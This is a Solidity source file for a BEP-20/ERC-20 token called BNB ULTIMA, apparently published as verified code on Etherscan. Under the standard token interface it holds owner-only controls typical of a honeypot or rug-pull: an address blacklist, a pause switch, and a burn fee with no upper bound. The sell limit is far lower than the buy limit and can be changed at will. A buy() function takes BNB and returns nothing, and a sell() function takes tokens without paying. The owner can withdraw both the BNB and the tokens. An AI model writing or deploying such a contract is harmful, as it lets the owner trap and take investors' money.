/**
 *Submitted for verification at Etherscan.io on 2022-07-08
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }
    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract BNB_ULTIMA is Context, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) public _balances;
     mapping (address => uint256) public selling;
     mapping (address => uint256) public buying;
     mapping (address=>bool) public  blacklist;

    mapping (address => mapping (address => uint256)) private _allowances;

    mapping (address => bool) public _isExcluded;
    // transfer conditions mapping
    
    mapping(address => uint256) public _firstTransfer;
    mapping(address => uint256) public _totTransfers;

    //pancake/uniswap/sunswap selling condition 
    mapping(address => uint256) public _firstSelltime;
    mapping(address => uint256) public _totalAmountSell;

    // pancake/uniswap/sunswap buying condition
    mapping(address => uint256) public _firstBuytime;
    mapping(address => uint256) public _totalAmountBuy;

    // multisendtoken receiver condition
    mapping(address => uint256) public _firstReceivetime;
    mapping(address => uint256) public _totalAmountreceive;






    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    uint8 private _decimals;


      address public pancakePair;
    
       uint256 public maxsellamount=2E18;
       uint256 public maxbuyamount=50E18;
       uint256 public maxTrPerDay = 50E18;
       uint256 public maxMultisendPday=1000E18;
       uint256 public burnfee=1; //1 % on each transaction
       address public owner;
       address public multisendaccount;
       uint256 public locktime= 1 days;
       address public deadaddress=0x0000000000000000000000000000000000000000;
      
     



    constructor ()  {
        _name = 'BNB ULTIMA';
        _symbol = 'BNBU';
        _totalSupply = 10000000000e18;
        _decimals = 18;
        _isExcluded[msg.sender]=true;
        
        
          owner=msg.sender;
          _balances[owner] = _totalSupply;
                  _paused = false;
        emit Transfer(address(0), owner, _totalSupply);
        
    }

     modifier onlyOwner() {
        require(msg.sender==owner, "Only Call by Owner");
        _;
    }


    /**
     * @dev Emitted when the pause is triggered by `account`.
     */
    event Paused(address account);

    /**
     * @dev Emitted when the pause is lifted by `account`.
     */
    event Unpaused(address account);

    bool private _paused;

    /**
     * @dev Initializes the contract in unpaused state.
     */
 

      


    /**
     * @dev Returns true if the contract is paused, and false otherwise.
     */
    function paused() public view virtual returns (bool) {
        return _paused;
    }

    /**
     * @dev Modifier to make a function callable only when the contract is not paused.
     *
     * Requirements:
     *
     * - The contract must not be paused.
     */
    modifier whenNotPaused() {
        require(!paused(), "Pausable: paused");
        _;
    }

    /**
     * @dev Modifier to make a function callable only when the contract is paused.
     *
     * Requirements:
     *
     * - The contract must be paused.
     */
    modifier whenPaused() {
        require(paused(), "Pausable: not paused");
        _;
    }

    /**
     * @dev Triggers stopped state.
     *
     * Requirements:
     *
     * - The contract must not be paused.
     */
    function _pause() internal virtual whenNotPaused {
        _paused = true;
        emit Paused(msg.sender);
    }

    /**
     * @dev Returns to normal state.
     *
     * Requirements:
     *
     * - The contract must be paused.
     */
    function _unpause() internal virtual whenPaused {
        _paused = false;
        emit Unpaused(msg.sender);
    }

    function pauseContract() public onlyOwner{
        _pause();

    }
    function unpauseContract() public onlyOwner{
        _unpause();

    }

//         
    // 





    

    function name() public view returns (string memory) {
        return _name;
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function decimals() public view returns (uint8) {
        return _decimals;
    }
    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
    function transfer(address recipient, uint256 amount) public virtual whenNotPaused override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address _owner, address spender) public view virtual override returns (uint256) {
        return _allowances[_owner][spender];
    }
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public whenNotPaused virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual whenNotPaused returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual whenNotPaused returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
    

    function _transfer(address sender, address recipient, uint256 amount) internal whenNotPaused virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(blacklist[sender]==false,"you are blacklisted");
        require(blacklist[recipient]==false,"you are blacklisted");
        _beforeTokenTransfer(sender, recipient, amount);  
        uint256 bunrpercent= (amount.mul(burnfee)).div(100);
        uint256 remainingamount=amount.sub(bunrpercent);
        
         if(sender==owner && recipient == pancakePair  ){
            _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);	
         selling[sender]=selling[sender].add(amount);

        }    

          else if(sender==owner){
            _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
            _balances[recipient] = _balances[recipient].add(amount);
        }
////////////////////////////////////////////////////////////////////////        
                    // Selling limits
// ////////////////////////////////////////////////////////////////////
        else if (recipient == pancakePair ){
        if(_isExcluded[sender]==false ){
        if(block.timestamp < _firstSelltime[sender].add(locktime)){			 
			
				require(_totalAmountSell[sender]+amount <= maxsellamount, "You can't sell more than maxsellamount 1");
				_totalAmountSell[sender]= _totalAmountSell[sender].add(amount);
                _balances[sender] = _balances[sender].sub(amount, "ERC20: buy amount exceeds balance 1");
                  _balances[address(0)] = _balances[address(0)].add(bunrpercent);
                _balances[recipient] = _balances[recipient].add(remainingamount);
			}  

        else if(block.timestamp>_firstSelltime[sender].add(locktime)){
               _totalAmountSell[sender]=0;
                 require(_totalAmountSell[sender].add(amount) <= maxsellamount, "You can't sell more than maxsellamount 2");
                 _balances[sender] = _balances[sender].sub(amount, "ERC20: buy amount exceeds balance 1");
                  _balances[address(0)] = _balances[address(0)].add(bunrpercent);
                _balances[recipient] = _balances[recipient].add(remainingamount);
                _totalAmountSell[sender] =_totalAmountSell[sender].add(amount);
                _firstSelltime[sender]=block.timestamp;
        }
        }
        else{
            _balances[sender] = _balances[sender].sub(amount, "ERC20: buy amount exceeds balance 1");
             _balances[recipient] = _balances[recipient].add(amount);
            _totalAmountSell[sender] =_totalAmountSell[sender].add(amount);
        }

			}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////// 
                              // Buying Condition
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////

        else if(sender==pancakePair) {

        if(_isExcluded[recipient]==false ){
        if(block.timestamp < _firstBuytime[recipient].add(locktime)){			 
			
				require(_totalAmountBuy[recipient]+amount <= maxbuyamount, "You can't sell more than maxbuyamount 1");
				_totalAmountBuy[recipient]= _totalAmountBuy[recipient].add(amount);
                 _balances[sender] = _balances[sender].sub(amount, "ERC20: buy amount exceeds balance 1");
                  _balances[address(0)] = _balances[address(0)].add(bunrpercent);
                _balances[recipient] = _balances[recipient].add(remainingamount);
			}  

        else if(block.timestamp>_firstBuytime[recipient].add(locktime)){
               _totalAmountBuy[recipient]=0;
                 require(_totalAmountBuy[recipient].add(amount) <= maxbuyamount, "You can't sell more than maxbuyamount 2");
                  _balances[sender] = _balances[sender].sub(amount, "ERC20: buy amount exceeds balance 1");
                  _balances[address(0)] = _balances[address(0)].add(bunrpercent);
                _balances[recipient] = _balances[recipient].add(remainingamount);
                _totalAmountBuy[recipient] =_totalAmountBuy[recipient].add(amount);
                _firstBuytime[recipient]=block.timestamp;
        }
        }
        else{
            _balances[sender] = _balances[sender].sub(amount, "ERC20: buy amount exceeds balance 1");
             _balances[recipient] = _balances[recipient].add(amount);
            _totalAmountBuy[recipient] =_totalAmountBuy[recipient].add(amount);
        }
            

        }
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////
            // multisendaccount transfer

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////
        else if(sender==multisendaccount){
         if(block.timestamp < _firstReceivetime[recipient].add(locktime)){			 
			
				require(_totalAmountreceive[recipient]+amount <= maxMultisendPday, "You can't transfer more than maxMultisendPday to receiver address 1");
				_totalAmountreceive[recipient]= _totalAmountreceive[recipient].add(amount);
                 _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance 1");
                _balances[recipient] = _balances[recipient].add(amount);
			}  

        else if(block.timestamp>_firstReceivetime[recipient].add(locktime)){
               _totalAmountreceive[recipient]=0;
                 require(_totalAmountreceive[recipient].add(amount) <= maxMultisendPday, "You can't transfer more than maxMultisendPday to receiver address 2");
                  _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance 2");
                _balances[recipient] = _balances[recipient].add(amount);
                _totalAmountreceive[recipient] =_totalAmountreceive[recipient].add(amount);
                _firstReceivetime[recipient]=block.timestamp;
        }
         else{
            _balances[sender] = _balances[sender].sub(amount, "ERC20: multisendamount amount exceeds balance 3");
            _balances[recipient] = _balances[recipient].add(amount);
        }    
        


        }

        	/////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    // exclude receiver
///////////////////////////////////////////////////////////////////////////////////////////////////////////////// 
else if(_isExcluded[recipient]==true )
       {
           _balances[sender] = _balances[sender].sub(amount, "ERC20: simple transfer amount exceeds balance 3");
            _balances[recipient] = _balances[recipient].add(amount);
       }
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////
                                // simple transfer
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////
       else if(_isExcluded[sender]==false ){
       if(block.timestamp < _firstTransfer[sender].add(locktime)){			 
			
				require(_totTransfers[sender]+amount <= maxTrPerDay, "You can't transfer more than maxTrPerDay 1");
				_totTransfers[sender]= _totTransfers[sender].add(amount);
                 _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance 1");
                 _balances[address(0)] = _balances[address(0)].add(bunrpercent);
                _balances[recipient] = _balances[recipient].add(remainingamount);
			}  

        else if(block.timestamp>_firstTransfer[sender].add(locktime)){
               _totTransfers[sender]=0;
                 require(_totTransfers[sender].add(amount) <= maxTrPerDay, "You can't transfer more than maxTrPerDay 2");
                   _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance 1");
                 _balances[address(0)] = _balances[address(0)].add(bunrpercent);
                _balances[recipient] = _balances[recipient].add(remainingamount);
                _totTransfers[sender] =_totTransfers[sender].add(amount);
                _firstTransfer[sender]=block.timestamp;
        }
         else{
             _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance 1");
            _balances[address(0)] = _balances[address(0)].add(bunrpercent);
             _balances[recipient] = _balances[recipient].add(remainingamount);
        }

             
       }
// ///////////////////////////////////////////////////////////////////////////////////
                            // tranfer for excluded accounts
//////////////////////////////////////////////////////////////////////////////////////
       else if(_isExcluded[sender]==true )
       {
           _balances[sender] = _balances[sender].sub(amount, "ERC20: simple transfer amount exceeds balance 3");
            _balances[recipient] = _balances[recipient].add(amount);
       }
        emit Transfer(sender, recipient, amount);
    }






    function _approve(address _owner, address spender, uint256 amount) internal whenNotPaused virtual {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }
    function _setupDecimals(uint8 decimals_) internal {
        _decimals = decimals_;
    }

      function _mint(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 value) internal whenNotPaused {
        require(account != address(0), "ERC20: burn from the zero address");

        _totalSupply = _totalSupply.sub(value);
        _balances[account] = _balances[account].sub(value);
        emit Transfer(account, address(0), value);
    }


    function addpairaddress(address _pair) public onlyOwner whenNotPaused{
        pancakePair=_pair;

    }
        
    function transferownership(address _newonwer) public whenNotPaused onlyOwner{
        owner=_newonwer;
    }

     
    function setbuylimit(uint256 _amount) public onlyOwner whenNotPaused{
    maxbuyamount=_amount*1E18;
    }

      function setmaxsell(uint256 _amount) public whenNotPaused onlyOwner{

        maxsellamount=_amount*1E18;

    }

    function setTransferperdaylimti(uint256 _amount) public onlyOwner whenNotPaused{
        maxTrPerDay=_amount*1E18;
    }

    function setmaxMultisendPday(uint256 _amount) public onlyOwner whenNotPaused{
        maxMultisendPday=_amount*1E18;
    }

    function addtoblacklist(address _addr) public onlyOwner whenNotPaused{
        require(blacklist[_addr]==false,"already blacklisted");
        blacklist[_addr]=true;
    }

    function removefromblacklist(address _addr) public onlyOwner whenNotPaused{
        require(blacklist[_addr]==true,"already removed from blacklist");
        blacklist[_addr]=false;
    }

    event Multisended(uint256 total, address tokenAddress);

     
    function register(address _address)public pure returns(address)
    {
        return _address;
    }
    
    
    function multisendToken( address[] calldata _contributors, uint256[] calldata __balances) external whenNotPaused  
        {
            uint8 i = 0;
            for (i; i < _contributors.length; i++) {
            _transfer(msg.sender,_contributors[i], __balances[i]);
            }
        }
    
    
  
    function sendMultiBnb(address payable[]  memory  _contributors, uint256[] memory __balances) public  payable whenNotPaused
    {
        uint256 total = msg.value;
        uint256 i = 0;
        for (i; i < _contributors.length; i++) {
            require(total >= __balances[i],"Invalid Amount");
            total = total - __balances[i];
            _contributors[i].transfer(__balances[i]);
        }
        emit Multisended(  msg.value , msg.sender);
    }


    function buy() external payable whenNotPaused
    {
        require(msg.value>0,"Select amount first");
    }
    
    
    function sell (uint256 _token) external whenNotPaused
    {
        require(_token>0,"Select amount first");
        _transfer(msg.sender,address(this),_token);
    }
    
    
    
    function withDraw (uint256 _amount) onlyOwner public whenNotPaused
    {
        payable(msg.sender).transfer(_amount);
    }
    
    
    
    function getTokens (uint256 _amount) onlyOwner public whenNotPaused
    {
        _transfer(address(this),msg.sender,_amount);
    }
    function ExcludefromLimits(address _addr,bool _state) public onlyOwner whenNotPaused{
        _isExcluded[_addr]=_state;
    }

    function setmultisendaccount (address _addr) public onlyOwner whenNotPaused{
        multisendaccount=_addr;
    }
    function setburnfeepercent(uint256 _percent) public onlyOwner whenNotPaused{
        burnfee=_percent;
    }

    function burnedamount() public view returns(uint256){
        return balanceOf(deadaddress);
    }
    function setdeadaddress(address _addr) public onlyOwner whenNotPaused{
        deadaddress=_addr;
    }
  

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }
}